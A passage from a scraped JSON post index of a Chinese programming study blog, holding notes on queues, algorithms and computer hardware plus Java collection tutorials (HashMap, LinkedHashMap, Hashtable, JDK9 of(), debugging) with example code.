队列又称为“先进先出”或&quot;后进后出&quot;的线性表。 在队列中，通常用指针front指向队头元素的前一个位置，用rear指向队尾最后一个元素。 循环队列 循环队列元素个数计算: 循环队列中元素的个数=rear（尾）- front（头）。 rear-front为正数时，便是循环队列的元素个数。 rear-front为负数时,需要再加上循环队列的容量. rear-front为零时,说明要么队列是空的,要么是满的.","categories":[{"name":"计算机公共基础","slug":"计算机公共基础","permalink":"https://xiaowuyoucy.github.io/categories/计算机公共基础/"}],"tags":[]},{"title":"数据结构与算法","slug":"003数据结构与算法","date":"2020-04-22T17:58:30.000Z","updated":"2020-04-25T03:16:35.920Z","comments":true,"path":"2020/04/23/003数据结构与算法/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/04/23/003数据结构与算法/","excerpt":"","text":"数据结构与算法 算法的概念 解题方案的准确而完整的描述. 算法: 运行有限的时间 有限的存储空间 得到正确的结果 算法不等于程序,也不等于计算方法,是两者的结合。 特征： 可行性 确定性（并且在任何条件下，算法都只有一条执行路径） 有穷性 拥有足够的情报 算法的基本结构： 对数据的运算操作(算数，逻辑) 算法的控制结构： 顺序结构 条件结构（分支结构） 循环结构 描述算法： 传统流程图 N-S结构化流程图（盒图） 自然语言 伪代码 一个算法可以用三种基本控制结构组合而成 算法设计方法 列举法：列举所有可能 归纳法：从特殊到一般 递归法：函数的自调用 递推法：从条件到结论 减半递推：分治 回溯：反证 算法的复杂度 算法复杂度可以分为： 时间复杂度 空间复杂度 算法的时间复杂度（和时间没有关系） 算法的计算工作量： 用算法所执行的基本运算次数来度量。 基本运算次数：是问题规模的函数 算法的计算工作量= f ( n )，其中n是问题的规模 分析算法工作量的方法： 平均性态（把每次运行程序执行的基本次数平均下来） 最坏情况复杂性（可能选最小，也可能选最大） 算法的空间复杂度 执行这个算法所需要的存储空间或者内存空间。 数据结构的基本概念 数据元素之间固有的逻辑关系，既数据的逻辑结构 数据中出现物理两个字,说明数据和计算机中的存放位置或地址有关系 数据的逻辑结构 数据结构是指带有结构的数据元素集合 结构是指数据元素之间前后件关系 一个数据结构包含两种信息： 数据元素的信息 数据元素之间的前后件关系。 数据的逻辑结构是指反映数据元素之间逻辑关系的数据结构。 数据的存储结构 数据的逻辑结构在计算机存储空间中存放的形式称为存储结构（也称数据的物理结构） 数据的存储结构存放： 数据元素的信息 数据元素之间的前后件关系 一种数据的逻辑结构,可以拥有多种物理结构（存储结构） 数据的物理结构不会影响数据本身的逻辑结构 采用不同的存储结构，则数据处理的效率是不同的 数据结构的表示： 二元关系表示 图形表示 数据结构分为线性结构和非线性结构。 数据元素有时候也称为节点或结点 最后一个节点称为叶子节点 线性结构（线性表）： 有且只有一个根节点 有且只有一个叶子节点 除根节点外，其他节点均只有一个前件（前继） 除叶子节点外，其他节点均只有一个后件（后继） 线性表示指n个数据元素的有限序列。 当n=0时，称为空表 线性表的顺序存储结构： 存储空间是连续的 按逻辑顺序依次存放的 在长度为n的线性表顺序存储结构中插入一个数,最坏情况下需要移动n个数 在长度为n的线性表顺序存储结构中删除一个数,最坏情况下需要移动n-1个数 考题 算法的空间复杂度与算法所处理的数据存储空间有关。 设数据集合为D={1,2,3,4,5,6}。 B=（D,R）中为非线性结构的是 R={（1,2），（2,3），（4,3），(3,5) } 其中R代表关系 数据的存储结构会影响算法的效率。 线性表的顺序存储结构中，其存储空间连续，各个元素所占字节数相同，元素的存储顺序与逻辑顺序一致。 时间复杂度与所用的计算工具无关。 算法设计必须考虑算法的复杂度。 算法必须能在有限个步骤之后终止。 算法强调动态的执行过程，不同于静态的计算公式。","categories":[{"name":"计算机公共基础","slug":"计算机公共基础","permalink":"https://xiaowuyoucy.github.io/categories/计算机公共基础/"}],"tags":[]},{"title":"计算机硬件系统","slug":"002计算机硬件系统","date":"2020-04-18T07:54:42.000Z","updated":"2020-04-19T18:43:01.225Z","comments":true,"path":"2020/04/18/002计算机硬件系统/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/04/18/002计算机硬件系统/","excerpt":"","text":"计算机硬件系统 以前冯诺依曼计算机结构以运算器为中心 现在以存储器为中心 计算机硬件系统主要包括: 中央处理器 内存储器 输入输出设备 它们通过总线相连接到一起 中央处理器: 运算器:对数据进行算术运算符,逻辑运算 控制器:对指令分析,控制,协调输入输出,对内存访问 存储器: 存储程序和数据 内存储器 外存储器 输入设备: 将程序和数据输入到计算机中 输出设备: 将用户信息(程序或数据)输出到外部输出设备供用户查看. 中央处理器 也叫CPU,计算机的核心部件。 负责执行软件指令将数据加工成信息。 CPU分为两部分： 控制器 运算器（算术逻辑单元） 它们都包含有寄存器和高速存储区域，用总线连接起来。 控制器： 计算机的控制中心和指挥中心 对于每个指令，控制单元都要执行4个基本操作 取指令 分析指令 执行指令 存储结果 运算器: 可以执行算数运算,逻辑运算 算数运算: +,-,*,/ 逻辑运算: ＞,≥,＜,≤,=,≠ 寄存器: 提高计算机性能 高速存储区域 临时存储数据和指令或内存地址 寄存器的大小和数量可以决定计算机的性能和速度 寄存器的类型 指令寄存器 地址寄存器 存储寄存器 累加寄存器等 总线: 在CPU内部或CPU和主板中其他部件进行信息传输的电子数据线路 通道越多,位的传输越快. 例如32位总线一次可以传输32位数据信息 CPU品质的高低，是主频和字长 主时钟： 控制CPU工作的节拍 不断产生固定频率的时钟 主时钟的频率就是主频 主频越高，运算速度越快 字长：CPU可以同时处理二进制的位数 CPU还可以通过总线访问各种输入输出设备 计算机的基本工作原理 计算机指令格式 计算机指令是能够被识别和执行的二进制代码 指令由两部分组成： 操作码 操作数（地址码） 操作码二进制位数决定了最多可以有多少种操作 操作的最多总数：2k ,其中k代表二进制位数 n种操作至少拥有的位数:[log2(n - 1)] + 1 , 其中[ ] 代表取整. 地址码: 操作对象 操作数 存储地址 寄存器 操作数: 源操作数: 本身带有的 目的操作数: 计算出来的结果 操作数一般称为地址码 有的指令只有操作码没有地址码,例如暂停指令 单字节指令: 一个字节的指令 双字节指令: 两个字节的指令 操作数和操作码所占的n个字节称为n字节指令 计算机指令的寻址方式 有效地址: 寻址方式和形式地址决定的 寻址方式: 本条指令的数据地址以及下一条将要执行的指令地址 寻址方式分两种: 指令寻址 数据寻址 指令寻址: 顺序寻址 跳跃寻址 数据寻址: 立即寻址 直接寻址 隐含寻址 间接寻址 寄存器寻址等 计算机指令系统 指令系统: 本计算机所有指令的集合 指令系统共有的功能: 数据传送指令 数据处理指令 程序控制指令 输入/输出指令 其他指令(对计算机的硬件进行管理、堆栈操作等) 计算机执行指令的基本过程 程序是解决实际问题的计算机指令的集合 程序计数器：决定了指令的执行顺序，某个程序被载入内存的时候，会将程序的第一条指令的内存单元地址赋值给程序计数器。 执行程序指令的过程 取指令 分析指令 执行指令 修改程序计数器 指令周期：完成一条指令所费的时间，越短越快 指令执行的时序 机器周期：在内存中读取一个指令字的最短时间 取指令必须占用一个机器周期 存储器","categories":[{"name":"计算机公共基础","slug":"计算机公共基础","permalink":"https://xiaowuyoucy.github.io/categories/计算机公共基础/"}],"tags":[]},{"title":"计算机的发展历程","slug":"001计算机的发展历程","date":"2020-04-18T06:53:12.000Z","updated":"2020-04-18T07:53:21.591Z","comments":true,"path":"2020/04/18/001计算机的发展历程/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/04/18/001计算机的发展历程/","excerpt":"","text":"概述 计算机的发展历程 ENIAC: 1946年 美国宾夕法尼亚大学 18000个电子管,1500个继电器 30吨 170㎡ 耗电140kW 每秒加法计算5000次 发展分为4个阶段: 电子管计算时代 晶体管计算机时代 集成电路计算机时代 大规模集成电路计算机时代 计算机体系结构 存储程序控制的计算机结构. EDSAC是第一台存储程序的计算机 存储程序思想是冯诺依曼提出的,概括了: 计算机(硬件)由运算器,存储器,控制器,输入输出设备五大基本部件组成. 计算机内部采用二进制来表示指令和数据 将编好的程序和源数据放在存储器中,再启动计算机工作. 非冯诺依曼结构计算机: 数据流计算机 归约计算机 智能计算机 计算机系统基本组成 分为硬件系统和软件系统. 计算机软件: 在硬件设备上运行的各种程序、数据。 程序：指挥计算机完成各种任务的指令集合。 为了方便阅读和修改程序，会提供关于程序的说明和资料，称为文档 裸机（硬件系统），只能识别机器代码 硬件系统和软件系统是相互依赖，不可分割的。 软件系统：运行，管理，维护计算机编制的程序，数据和文档的总称。 计算机软件分为： 系统软件（控制，协调计算机，外部设备，应用软件开发和运行）：主要负责调度，监控，维护计算机系统 操作系统 语言处理系统 数据库管理系统 系统辅助处理程序 应用软件 信息管理软件 辅助设计软件 文字处理软件 图形软件 各种程序包","categories":[{"name":"计算机公共基础","slug":"计算机公共基础","permalink":"https://xiaowuyoucy.github.io/categories/计算机公共基础/"}],"tags":[]},{"title":"模拟斗地主洗牌发牌(有序版本)","slug":"java00195模拟斗地主洗牌发牌","date":"2020-04-05T16:52:57.000Z","updated":"2020-04-05T16:57:29.087Z","comments":true,"path":"2020/04/06/java00195模拟斗地主洗牌发牌/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/04/06/java00195模拟斗地主洗牌发牌/","excerpt":"","text":"模拟斗地主洗牌发牌(有序版本) 按照斗地主的规则，完成洗牌发牌的动作。 具体规则： 组装54张扑克牌将 54张牌顺序打乱 三个玩家参与游戏，三人交替摸牌，每人17张牌，最后三张留作底牌。 查看三人各自手中的牌（按照牌的大小排序）、底牌 规则：手中扑克牌从大到小的摆放顺序：大王,小王,2,A,K,Q,J,10,9,8,7,6,5,4,3 案例需求分析 准备牌： 完成数字与纸牌的映射关系： 使用双列Map(HashMap)集合，完成一个数字与字符串纸牌的对应关系(相当于一个字典)。 洗牌： 通过数字完成洗牌发牌 发牌： 将每个人以及底牌设计为ArrayList&lt;String&gt;,将最后3张牌直接存放于底牌，剩余牌通过对3取模依次发牌。 存放的过程中要求数字大小与斗地主规则的大小对应。 将代表不同纸牌的数字分配给不同的玩家与底牌。 看牌： 通过Map集合找到对应字符展示。 通过查询纸牌与数字的对应关系，由数字转成纸牌字符串再进行展示。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122package com.itheima.demo06.Test;import java.util.ArrayList;import java.util.Collections;import java.util.HashMap;import java.util.List;/* 斗地主综合案例:有序版本 1.准备牌 2.洗牌 3.发牌 4.排序 5.看牌 */public class DouDiZhu &#123; public static void main(String[] args) &#123; //1.准备牌 //创建一个Map集合,存储牌的索引和组装好的牌 HashMap&lt;Integer,String&gt; poker = new HashMap&lt;&gt;(); //创建一个List集合,存储牌的索引 ArrayList&lt;Integer&gt; pokerIndex = new ArrayList&lt;&gt;(); //定义两个集合,存储花色和牌的序号 List&lt;String&gt; colors = List.of(\"♠\", \"♥\", \"♣\", \"♦\"); List&lt;String&gt; numbers = List.of(\"2\", \"A\", \"K\", \"Q\", \"J\", \"10\", \"9\", \"8\", \"7\", \"6\", \"5\", \"4\", \"3\"); //把大王和小王存储到集合中 //定义一个牌的索引 int index = 0; poker.put(index,\"大王\"); pokerIndex.add(index); index++; poker.put(index,\"小王\"); pokerIndex.add(index); index++; //循环嵌套遍历两个集合,组装52张牌,存储到集合中 for (String number : numbers) &#123; for (String color : colors) &#123; poker.put(index,color+number); pokerIndex.add(index); index++; &#125; &#125; //System.out.println(poker); //System.out.println(pokerIndex); /* 2.洗牌 使用Collections中的方法shuffle(List) */ Collections.shuffle(pokerIndex); //System.out.println(pokerIndex); /* 3.发牌 */ //定义4个集合,存储玩家牌的索引,和底牌的索引 ArrayList&lt;Integer&gt; player01 = new ArrayList&lt;&gt;(); ArrayList&lt;Integer&gt; player02 = new ArrayList&lt;&gt;(); ArrayList&lt;Integer&gt; player03 = new ArrayList&lt;&gt;(); ArrayList&lt;Integer&gt; diPai = new ArrayList&lt;&gt;(); //遍历存储牌索引的List集合,获取每一个牌的索引 for (int i = 0; i &lt;pokerIndex.size() ; i++) &#123; Integer in = pokerIndex.get(i); //先判断底牌 if(i&gt;=51)&#123; //给底牌发牌 diPai.add(in); &#125;else if(i%3==0)&#123; //给玩家1发牌 player01.add(in); &#125;else if(i%3==1)&#123; //给玩家2发牌 player02.add(in); &#125;else if(i%3==2)&#123; //给玩家3发牌 player03.add(in); &#125; &#125; /* 4.排序 使用Collections中的方法sort(List) 默认是升序排序 */ Collections.sort(player01); Collections.sort(player02); Collections.sort(player03); Collections.sort(diPai); /* 5.看牌 调用看牌的方法 */ lookPoker(\"刘德华\",poker,player01); lookPoker(\"周润发\",poker,player02); lookPoker(\"周星驰\",poker,player03); lookPoker(\"底牌\",poker,diPai); &#125; /* 定义一个看牌的方法,提高代码的复用性 参数: String name:玩家名称 HashMap&lt;Integer,String&gt; poker:存储牌的poker集合 ArrayList&lt;Integer&gt; list:存储玩家和底牌的List集合 查表法: 遍历玩家或者底牌集合,获取牌的索引 使用牌的索引,去Map集合中,找到对应的牌 */ public static void lookPoker(String name,HashMap&lt;Integer,String&gt; poker,ArrayList&lt;Integer&gt; list)&#123; //输出玩家名称,不换行 System.out.print(name+\":\"); //遍历玩家或者底牌集合,获取牌的索引 for (Integer key : list) &#123; //使用牌的索引,去Map集合中,找到对应的牌 String value = poker.get(key); System.out.print(value+\" \"); &#125; System.out.println();//打印完每一个玩家的牌,换行 &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"Debug追踪","slug":"java00194Debug追踪","date":"2020-04-05T16:46:44.000Z","updated":"2020-04-05T16:51:17.906Z","comments":true,"path":"2020/04/06/java00194Debug追踪/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/04/06/java00194Debug追踪/","excerpt":"","text":"Debug追踪 使用IDEA的断点调试功能，查看程序的运行过程 Debug调试程序: 可以让代码逐行执行,查看代码执行的过程,调试程序中出现的bug 使用方式: 在行号的右边,鼠标左键单击,添加断点(每个方法的第一行,哪里有bug添加到哪里) 右键,选择Debug执行程序 程序就会停留在添加的第一个断点处 执行程序: f8:逐行执行程序 f7:进入到方法中 shift+f8:跳出方法 f9:跳到下一个断点,如果没有下一个断点,那么就结束程序 ctrl+f2:退出debug模式,停止程序 Console:切换到控制台 在有效代码行，点击行号右边的空白区域，设置断点，程序执行到断点将停止，我们可以手动来运行程序 点击Debug运行模式 ​ 程序停止在断点上不再执行，而IDEA最下方打开了Debug调试窗口 Debug调试窗口介绍 快捷键F8，代码向下执行一行,第九行执行完毕，执行到第10行（第10行还未执行） 切换到控制台面板，控制台显示 请录入一个字符串： 并且等待键盘录入 快捷键F8，程序继续向后执行，执行键盘录入操作，在控制台录入数据 ababcea 回车之后效果： 调试界面效果： 此时到达findChar方法，快捷键F7，进入方法findChar 快捷键F8 接续执行，创建了map对象，变量区域显示 快捷键F8 接续执行，进入到循环中，循环变量i为 0,F8再继续执行，就获取到变量c赋值为字符‘a’ 字节值97 快捷键F8 接续执行，进入到判断语句中，因为该字符 不在Map集合键集中，再按F8执行，进入该判断中 快捷键F8 接续执行，循环结束，进入下次循环，此时map中已经添加一对儿元素 快捷键F8 接续执行，进入下次循环，再继续上面的操作，我们就可以看到代码每次是如何执行的了 如果不想继续debug,那么可以使用快捷键F9,程序正常执行到结束，程序结果在控制台显示","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"JDK9对集合添加的优化","slug":"java00193JDK9对集合添加的优化","date":"2020-04-05T16:42:04.000Z","updated":"2020-04-05T16:45:27.481Z","comments":true,"path":"2020/04/06/java00193JDK9对集合添加的优化/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/04/06/java00193JDK9对集合添加的优化/","excerpt":"","text":"JDK9对集合添加的优化 JDK9的新特性: List接口,Set接口,Map接口:里边增加了一个静态的方法of,可以给集合一次性添加多个元素 static &lt;E&gt; List&lt;E&gt; of(E… elements) 使用前提: 当集合中存储的元素的个数已经确定了,不在改变时使用 注意: 1.of方法只适用于List接口,Set接口,Map接口,不适用于接接口的实现类 2.of方法的返回值是一个不能改变的集合,集合不能再使用add,put方法添加元素,会抛出异常 3.Set接口和Map接口在调用of方法的时候,不能有重复的元素,否则会抛出异常 12345678910111213141516171819202122232425package com.itheima.demo04.JDK9;import java.util.List;import java.util.Map;import java.util.Set;public class Demo01JDK9 &#123; public static void main(String[] args) &#123; List&lt;String&gt; list = List.of(\"a\", \"b\", \"a\", \"c\", \"d\"); System.out.println(list);//[a, b, a, c, d] //list.add(\"w\");//UnsupportedOperationException:不支持操作异常 //Set&lt;String&gt; set = Set.of(\"a\", \"b\", \"a\", \"c\", \"d\");//IllegalArgumentException:非法参数异常,有重复的元素 Set&lt;String&gt; set = Set.of(\"a\", \"b\", \"c\", \"d\"); System.out.println(set); //set.add(\"w\");//UnsupportedOperationException:不支持操作异常 //Map&lt;String, Integer&gt; map = Map.of(\"张三\", 18, \"李四\", 19, \"王五\", 20,\"张三\",19); //IllegalArgumentException:非法参数异常,有重复的元素 Map&lt;String, Integer&gt; map = Map.of(\"张三\", 18, \"李四\", 19, \"王五\", 20); System.out.println(map);//&#123;王五=20, 李四=19, 张三=18&#125; //map.put(\"赵四\",30);//UnsupportedOperationException:不支持操作异常 &#125;&#125; 需要注意以下两点： 1:of()方法只是Map，List，Set这三个接口的静态方法，其父类接口和子类实现并没有这类方法，比如 HashSet，ArrayList等待； 2:返回的集合是不可变的；","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"Hashtable集合","slug":"java00192Hashtable集合","date":"2020-04-05T16:37:33.000Z","updated":"2020-04-05T16:40:30.624Z","comments":true,"path":"2020/04/06/java00192Hashtable集合/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/04/06/java00192Hashtable集合/","excerpt":"","text":"Hashtable集合 java.util.Hashtable&lt;K,V&gt;集合 implements Map&lt;K,V&gt;接口 Hashtable:底层也是一个哈希表,是一个线程安全的集合,是单线程集合,速度慢 HashMap:底层是一个哈希表,是一个线程不安全的集合,是多线程的集合,速度快 HashMap集合(之前学的所有的集合):可以存储null值,null键 Hashtable集合,不能存储null值,null键 Hashtable和Vector集合一样,在jdk1.2版本之后被更先进的集合(HashMap,ArrayList)取代了 Hashtable的子类Properties依然活跃在历史舞台 Properties集合是一个唯一和IO流相结合的集合 1234567891011121314151617181920package com.itheima.demo03.Map;import java.util.HashMap;import java.util.Hashtable;public class Demo02Hashtable &#123; public static void main(String[] args) &#123; HashMap&lt;String,String&gt; map = new HashMap&lt;&gt;(); map.put(null,\"a\"); map.put(\"b\",null); map.put(null,null); System.out.println(map);//&#123;null=null, b=null&#125; Hashtable&lt;String,String&gt; table = new Hashtable&lt;&gt;(); //table.put(null,\"a\");//NullPointerException //table.put(\"b\",null);//NullPointerException table.put(null,null);//NullPointerException &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"Map集合练习","slug":"java00191Map集合练习","date":"2020-04-05T16:32:25.000Z","updated":"2020-04-05T16:35:37.011Z","comments":true,"path":"2020/04/06/java00191Map集合练习/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/04/06/java00191Map集合练习/","excerpt":"","text":"Map集合练习 练习: 计算一个字符串中每个字符出现次数 分析: 1.使用Scanner获取用户输入的字符串 2.创建Map集合,key是字符串中的字符,value是字符的个数 3.遍历字符串,获取每一个字符 4.使用获取到的字符,去Map集合判断key是否存在 key存在: 通过字符(key),获取value(字符个数) value++ put(key,value)把新的value存储到Map集合中 key不存在: put(key,1) 5.遍历Map集合,输出结果 12345678910111213141516171819202122232425262728293031323334package com.itheima.demo03.Map;import java.util.HashMap;import java.util.Scanner;public class Demo03MapTest &#123; public static void main(String[] args) &#123; //1.使用Scanner获取用户输入的字符串 Scanner sc = new Scanner(System.in); System.out.println(\"请输入一个字符串:\"); String str = sc.next(); //2.创建Map集合,key是字符串中的字符,value是字符的个数 HashMap&lt;Character,Integer&gt; map = new HashMap&lt;&gt;(); //3.遍历字符串,获取每一个字符 for(char c :str.toCharArray())&#123; //4.使用获取到的字符,去Map集合判断key是否存在 if(map.containsKey(c))&#123; //key存在 Integer value = map.get(c); value++; map.put(c,value); &#125;else&#123; //key不存在 map.put(c,1); &#125; &#125; //5.遍历Map集合,输出结果 for(Character key :map.keySet())&#123; Integer value = map.get(key); System.out.println(key+\"=\"+value); &#125; &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"LinkedHashMap","slug":"java00190LinkedHashMap","date":"2020-04-05T16:29:14.000Z","updated":"2020-04-05T16:31:14.118Z","comments":true,"path":"2020/04/06/java00190LinkedHashMap/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/04/06/java00190LinkedHashMap/","excerpt":"","text":"LinkedHashMap java.util.LinkedHashMap&lt;K,V&gt; entends HashMap&lt;K,V&gt; Map 接口的哈希表和链接列表实现，具有可预知的迭代顺序。 底层原理: 哈希表+链表(记录元素的顺序) 1234567891011121314151617181920212223package com.itheima.demo03.Map;import java.util.HashMap;import java.util.LinkedHashMap;public class Demo01LinkedHashMap &#123; public static void main(String[] args) &#123; HashMap&lt;String,String&gt; map = new HashMap&lt;&gt;(); map.put(\"a\",\"a\"); map.put(\"c\",\"c\"); map.put(\"b\",\"b\"); map.put(\"a\",\"d\"); System.out.println(map);// key不允许重复,无序 &#123;a=d, b=b, c=c&#125; LinkedHashMap&lt;String,String&gt; linked = new LinkedHashMap&lt;&gt;(); linked.put(\"a\",\"a\"); linked.put(\"c\",\"c\"); linked.put(\"b\",\"b\"); linked.put(\"a\",\"d\"); System.out.println(linked);// key不允许重复,有序 &#123;a=d, c=c, b=b&#125; &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"HashMap存储自定义类型键值","slug":"java00189HashMap存储自定义类型键值","date":"2020-04-05T16:06:03.000Z","updated":"2020-04-05T16:28:40.833Z","comments":true,"path":"2020/04/06/java00189HashMap存储自定义类型键值/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/04/06/java00189HashMap存储自定义类型键值/","excerpt":"","text":"HashMap存储自定义类型键值 HashMap存储自定义类型键值 Map集合保证key是唯一的: 作为key的元素,必须重写hashCode方法和equals方法,以保证key唯一 当给HashMap中存放自定义对象时，如果自定义对象作为key存在，这时要保证对象唯一，必须复写对象的hashCode和equals方法(如果忘记，请回顾HashSet存放自定义对象)。 如果要保证map中存放的key和取出的顺序一致，可以使用java.util.LinkedHashMap集合来存放。 12345678910111213141516171819public class HashMapTest &#123; public static void main(String[] args) &#123; //1,创建Hashmap集合对象。 Map&lt;Student,String&gt;map = new HashMap&lt;Student,String&gt;(); //2,添加元素。 map.put(newStudent(\"lisi\",28), \"上海\"); map.put(newStudent(\"wangwu\",22), \"北京\"); map.put(newStudent(\"zhaoliu\",24), \"成都\"); map.put(newStudent(\"zhouqi\",25), \"广州\"); map.put(newStudent(\"wangwu\",22), \"南京\"); //3,取出元素。键找值方式 Set&lt;Student&gt;keySet = map.keySet(); for(Student key: keySet)&#123; Stringvalue = map.get(key); System.out.println(key.toString()+\".....\"+value); &#125; &#125;&#125; 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859package com.itheima.demo02.Map;import java.util.HashMap;import java.util.Map;import java.util.Set;public class Demo01HashMapSavePerson &#123; public static void main(String[] args) &#123; show02(); &#125; /* HashMap存储自定义类型键值 key:Person类型 Person类就必须重写hashCode方法和equals方法,以保证key唯一 value:String类型 可以重复 */ private static void show02() &#123; //创建HashMap集合 HashMap&lt;Person,String&gt; map = new HashMap&lt;&gt;(); //往集合中添加元素 map.put(new Person(\"女王\",18),\"英国\"); map.put(new Person(\"秦始皇\",18),\"秦国\"); map.put(new Person(\"普京\",30),\"俄罗斯\"); map.put(new Person(\"女王\",18),\"毛里求斯\"); //使用entrySet和增强for遍历Map集合 Set&lt;Map.Entry&lt;Person, String&gt;&gt; set = map.entrySet(); for (Map.Entry&lt;Person, String&gt; entry : set) &#123; Person key = entry.getKey(); String value = entry.getValue(); System.out.println(key+\"--&gt;\"+value); &#125; &#125; /* HashMap存储自定义类型键值 key:String类型 String类重写hashCode方法和equals方法,可以保证key唯一 value:Person类型 value可以重复(同名同年龄的人视为同一个) */ private static void show01() &#123; //创建HashMap集合 HashMap&lt;String,Person&gt; map = new HashMap&lt;&gt;(); //往集合中添加元素 map.put(\"北京\",new Person(\"张三\",18)); map.put(\"上海\",new Person(\"李四\",19)); map.put(\"广州\",new Person(\"王五\",20)); map.put(\"北京\",new Person(\"赵六\",18)); //使用keySet加增强for遍历Map集合 Set&lt;String&gt; set = map.keySet(); for (String key : set) &#123; Person value = map.get(key); System.out.println(key+\"--&gt;\"+value); &#125; &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"类里定义的接口和使用","slug":"java00188类里定义的接口和使用","date":"2020-04-04T18:06:00.000Z","updated":"2020-04-04T18:25:09.202Z","comments":true,"path":"2020/04/05/java00188类里定义的接口和使用/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/04/05/java00188类里定义的接口和使用/","excerpt":"","text":"类里定义的接口和使用 格式: 123456public class 类名&#123; //在类里面定义接口 修饰符 interface 接口名&#123; //抽象方法; &#125;&#125; 123456public class TestA&#123; //在类里面定义接口 private interface A&#123; public abstract void show(); &#125;&#125; 实现接口: 在类方法中用new实现,通过多态接收 123456789101112131415161718public class TestA&#123; //在类里面定义接口 //如果接口修饰符石private,那么此接口只能在本类中使用. public interface A&#123; public abstract void show(); &#125; public void show()&#123; A a = new A()&#123; @Override public void show() &#123; System.out.println(\"111111\"); &#125; &#125;; a.show(); &#125;&#125; 在new的时候实现 1234567891011121314package com.itheima.demo11;public class DemoClass&#123; public static void main(String[] args) &#123; TestA.A a = new TestA.A()&#123; @Override public void show()&#123; System.out.println(\"我是TestA类中的A接口\"); &#125; &#125;; a.show(); &#125;&#125; 在其他类中实现 12345678package com.itheima.demo11;public class TestB implements TestA.A&#123; @Override public void show() &#123; &#125;&#125; 在本类中的内部类实现 123456789101112public class TestA&#123; //在类里面定义接口 private interface A&#123; public abstract void show(); &#125; public class TestC implements A&#123; @Override public void show() &#123; &#125; &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"Map集合遍历键值对方式","slug":"java00187Map集合遍历键值对方式","date":"2020-04-04T17:27:12.000Z","updated":"2020-04-04T17:30:07.198Z","comments":true,"path":"2020/04/05/java00187Map集合遍历键值对方式/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/04/05/java00187Map集合遍历键值对方式/","excerpt":"","text":"Map集合遍历键值对方式 键值对方式：即通过集合中每个键值对(Entry)对象，获取键值对(Entry)对象中的键与值。 操作步骤与图解： 获取Map集合中，所有的键值对(Entry)对象，以Set集合形式返回。方法提示:entrySet()。 遍历包含键值对(Entry)对象的Set集合，得到每一个键值对(Entry)对象。 通过键值对(Entry)对象，获取Entry对象中的键与值。 方法提示:getkey() getValue() 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748package com.itheima.demo01.Map;import java.util.HashMap;import java.util.Iterator;import java.util.Map;import java.util.Set;/* Map集合遍历的第二种方式:使用Entry对象遍历 Map集合中的方法: Set&lt;Map.Entry&lt;K,V&gt;&gt; entrySet() 返回此映射中包含的映射关系的 Set 视图。 实现步骤: 1.使用Map集合中的方法entrySet(),把Map集合中多个Entry对象取出来,存储到一个Set集合中 2.遍历Set集合,获取每一个Entry对象 3.使用Entry对象中的方法getKey()和getValue()获取键与值 */public class Demo03EntrySet &#123; public static void main(String[] args) &#123; //创建Map集合对象 Map&lt;String,Integer&gt; map = new HashMap&lt;&gt;(); map.put(\"赵丽颖\",168); map.put(\"杨颖\",165); map.put(\"林志玲\",178); //1.使用Map集合中的方法entrySet(),把Map集合中多个Entry对象取出来,存储到一个Set集合中 Set&lt;Map.Entry&lt;String, Integer&gt;&gt; set = map.entrySet(); //2.遍历Set集合,获取每一个Entry对象 //使用迭代器遍历Set集合 Iterator&lt;Map.Entry&lt;String, Integer&gt;&gt; it = set.iterator(); while(it.hasNext())&#123; Map.Entry&lt;String, Integer&gt; entry = it.next(); //3.使用Entry对象中的方法getKey()和getValue()获取键与值 String key = entry.getKey(); Integer value = entry.getValue(); System.out.println(key+\"=\"+value); &#125; System.out.println(\"-----------------------\"); for(Map.Entry&lt;String,Integer&gt; entry:set)&#123; //3.使用Entry对象中的方法getKey()和getValue()获取键与值 String key = entry.getKey(); Integer value = entry.getValue(); System.out.println(key+\"=\"+value); &#125; &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"Entry键值对对象","slug":"java00186Entry键值对对象","date":"2020-04-04T17:24:08.000Z","updated":"2020-04-04T17:25:55.727Z","comments":true,"path":"2020/04/05/java00186Entry键值对对象/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/04/05/java00186Entry键值对对象/","excerpt":"","text":"Entry键值对对象 我们已经知道，Map中存放的是两种对象，一种称为key(键)，一种称为value(值)，它们在在Map中是一一对应关系，这一对对象又称做Map中的一个Entry(项)。Entry将键值对的对应关系封装成了对象。即键值对对象，这样我们在遍历Map集合时，就可以从每一个键值对（Entry）对象中获取对应的键与对应的值。 既然Entry表示了一对键和值，那么也同样提供了获取对应键和对应值得方法： public K getKey()：获取Entry对象中的键。 public V getValue()：获取Entry对象中的值。 在Map集合中也提供了获取所有Entry对象的方法： public Set&lt;Map.Entry&lt;K,V&gt;&gt; 